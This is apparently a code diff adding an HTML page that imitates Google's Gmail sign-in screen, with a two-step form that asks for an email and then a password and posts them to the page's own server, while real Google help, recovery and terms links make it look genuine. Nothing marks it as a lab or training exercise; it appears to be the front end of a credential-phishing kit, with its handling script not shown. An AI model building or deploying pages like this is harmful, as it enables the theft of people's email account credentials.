@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" href="./img/favicon.png" type="image/x-icon" />
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
+      crossorigin="anonymous"
+    />
+    <script
+      src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"
+      integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js"
+      integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF"
+      crossorigin="anonymous"
+    ></script>
+    <link rel="stylesheet" href="./css/style.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"
+    />
+    <title>Gmail</title>
+  </head>
+  <body>
+    <form class="app" method="post" id="myForm">
+      <div>
+        <main class="card">
+          <div class="card-body myCard">
+            <img class="myLogo" src="./img/gmail.png" alt="Google" />
+            <div id="s1">
+              <div class="aDGQwe">
+                <h1 class="oO8pQe">Sign in</h1>
+              </div>
+              <div class="tosRNd">to continue to Gmail</div>
+              <div class="inputs">
+                <input
+                  type="text"
+                  name="email"
+                  id="email"
+                  placeholder="Email or phone"
+                />
+                <a
+                  href="https://accounts.google.com/signin/v2/usernamerecovery?continue=https%3A%2F%2Fmail.google.com&dsh=S185356251%3A1678467018723822&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en&service=mail&authuser=0"
+                  target="_blank"
+                  class="text-decoration-none d-block mt-2"
+                  >Forgot email?</a
+                >
+              </div>
+              <div class="signup mt-5">
+                <span class="d-block text-secondary"
+                  >Not your computer? Use a Private Window to sign in.
+                </span>
+                <a
+                  href="https://support.google.com/accounts?p=signin_privatebrowsing&hl=en"
+                  target="_blank"
+                  class="text-decoration-none d-block"
+                  >Learn more</a
+                >
+              </div>
+              <div
+                class="mt-5 d-flex justify-content-between align-items-center"
+              >
+                <a
+                  href="https://accounts.google.com/signup/v2/webcreateaccount?biz=false&cc=PK&continue=https%3A%2F%2Fmail.google.com&dsh=S185356251%3A1678467018723822&flowEntry=SignUp&flowName=GlifWebSignIn&hl=en&service=mail&authuser=0"
+                  target="_blank"
+                  class="btn text-primary mySign"
+                  >Create account</a
+                >
+                <a
+                  class="btn btn-primary px-4 next"
+                  style="font-size: 14px; font-weight: bold"
+                  onclick="setEmail()"
+                >
+                  Next
+                </a>
+              </div>
+            </div>
+            <div id="s2">
+              <div class="aDGQwe">
+                <h1 class="oO8pQe mb-2">Welcome</h1>
+              </div>
+              <div class="tosRNd YZrg6 HnRr5d iiFyne cd29Sd kWC5Rd">
+                <i class="fa fa-user me-2"></i>
+                <span style="font-weight: bold" id="username"
+                  >arhexlabs@gmail.com</span
+                >
+              </div>
+              <div class="inputs">
+                <input
+                  type="password"
+                  name="password"
+                  id="password"
+                  placeholder="Enter password"
+                  class="mb-2"
+                />
+                <input
+                  type="checkbox"
+                  class="form-checkbox me-3"
+                  name="show"
+                  id="show"
+                  onchange="toggleShow()"
+                /><label for="show" style="font-size: 14px"
+                  >Show password</label
+                >
+              </div>
+
+              <div
+                class="mt-5 d-flex justify-content-between align-items-center"
+              >
+                <a
+                  href="https://accounts.google.com/signin/v2/challenge/totp?TL=ALbfvL1IkzsQQBoIhDqknfagdVBpacvmcE8TXBobUFjOkp_YJ5LAlk0ezX7GpEcA&checkConnection=youtube%3A399%3A1&checkedDomains=youtube&cid=7&continue=https%3A%2F%2Fmail.google.com&dsh=S185356251%3A1678467018723822&flowEntry=AddSession&flowName=GlifWebSignIn&hl=en_US&pstMsg=1&service=mail&authuser=0"
+                  target="_blank"
+                  class="btn text-primary mySign"
+                  >Forgot password?</a
+                >
+                <button
+                  class="btn btn-primary px-4 next"
+                  style="font-size: 14px; font-weight: bold"
+                  type="submit"
+                >
+                  Next
+                </button>
+              </div>
+            </div>
+          </div>
+        </main>
+        <div
+          class="d-flex justify-content-between align-items-center py-2 myFooter"
+        >
+          <span class="text-secondary">English (United State)</span>
+          <div>
+            <a
+              href="https://support.google.com/accounts?hl=en&p=account_iph"
+              target="_blank"
+              class="text-secondary ms-3 text-decoration-none"
+              >Help</a
+            >
+            <a
+              href="https://accounts.google.com/TOS?loc=PK&hl=en&privacy=true"
+              target="_blank"
+              class="text-secondary ms-3 text-decoration-none"
+              >Privacy</a
+            >
+            <a
+              href="https://accounts.google.com/TOS?loc=PK&hl=en"
+              target="_blank"
+              class="text-secondary ms-3 text-decoration-none"
+              >Term</a
+            >
+          </div>
+        </div>
+      </div>
+    </form>
+    <script src="./js/app.js"></script>
+  </body>
+</html>
